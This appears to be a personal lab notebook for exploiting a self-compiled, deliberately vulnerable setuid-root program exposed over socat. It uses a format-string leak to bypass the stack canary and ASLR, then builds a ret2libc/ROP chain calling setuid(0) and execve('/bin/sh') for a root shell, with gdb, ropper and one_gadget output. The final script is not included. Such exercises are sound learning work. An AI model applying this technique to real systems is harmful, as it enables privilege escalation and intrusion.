### compile vulnerable file
```
robert@laptop:~$ gcc format.c -o format
robert@laptop:~$ sudo chown root format
robert@laptop:~$ sudo chmod +s format
```

### launch program as service
```
robert@laptop:~$ socat tcp-listen:5555,reuseaddr,fork, exec:"./format"
```

### try connecting to it
```
robert@laptop:~$ nc 127.0.0.1 5555
  What is your name?
```

### load program and analyze
```
robert@laptop:~$ gdb format -q

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

gdb-peda$ aslr
ASLR is OFF

gdb-peda$ disas center

gdb-peda$ b *center+95
```
- memory protection mechanisms like stack canary, nx bit are on
- set breakpoint before it verifies stack canary and decides calling stack_check_fail function

### run program with following params
```
gdb-peda$ r
Starting program: /home/robert/repos/exploits/formatString/format 
What is your name?
Name: %lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-
Hello 7fff812cbdb0-0-0-0-7f35758184c0-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a2d786c25-7fff812ce010-54cfbb8e45afe000-
Enter secret code !
Code: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Entered Command center with code > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA .
[----------------------------------registers-----------------------------------]
RAX: 0x54cfbb8e45afe000 
[...]
```
- Stack canary i.e '0x54cfbb8e45afe000' stored in rax register
- in memory dumped by format string, last value is stack canary
- problem for bypassing stack canary may be solved
- next: bypassing nx bit by returning to libc
- alsr turned on -> need to find libc base address every time

### get libc address
```
gdb-peda$ vmmap
[...]
0x00007f3575657000 0x00007f35757a4000 r-xp      /usr/lib/libc-2.32.so
[...]
```

### turn aslr on and run program again
```
gdb-peda$ aslr on
gdb-peda$ r
```

### get libc address offset again
```
gdb-peda$ vmmap
0x00007f4338b10000 0x00007f4338c5d000 r-xp      /usr/lib/libc-2.32.so
```

### choose 4th address and calc offset from libc addresses (first one is r8? todo why)
```
0x7f4338c71040 - 0x00007f4338b10000 = 0x161040
```
- offset will always be same for 4th address (correct; checked method above twice)

### find offset to stack canary and return address either by direct stack dump or pattern
```
0x7ffe72f68870: 0x4141414141414141 0x4141414141414141
0x7ffe72f68880: 0x4141414141414141 0x4141414141414141
0x7ffe72f68890: 0x0000000000000000 0x087f4107dcd08200  <== canary
0x7ffe72f688a0: 0x00007ffe72f68900 0x00005581705e893d  <== return address
```
```
robert@laptop:~$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 0x3765413665413565
[*] Exact match at offset 136
```
- result: offset 136 for stack canary + 152 for return address

## get pop rd;ret chain
```
robert@laptop:~$ ropper --file /lib/libc-2.32.so --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: /lib/libc-2.32.so
0x00000000000385d1: pop rdi; ret 0x18;
0x00000000001228fa: pop rdi; ret;
```

### final layout
```
code = 'A'*136 + canary(8) + 'B'*8 + return_address(8)
```

### strategy
- send format strings
- read output
- extract libc address + stack canary
- calc libc base from address + generate return to libc payload (last digits libc address always '000' -> offsets last digits the same)
- call setuid(0) (pop 0x0 to rdi register which will e passed to setuid)
- use one_gadget (installed via gem install one_gadget) execve

### find gadget
```
robert@laptop:~$  one_gadget /usr/lib/libc-2.32.so
0xcda5a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcda5d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcda60 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

### get offset of setuid
```
robert@laptop:~$ readelf -a /lib/libc-2.32.so | grep setuid
    27: 00000000000cdea0   152 FUNC    WEAK   DEFAULT   16 setuid@@GLIBC_2.2.5
```

### fill proper addresses in exploit.py

### todo fix script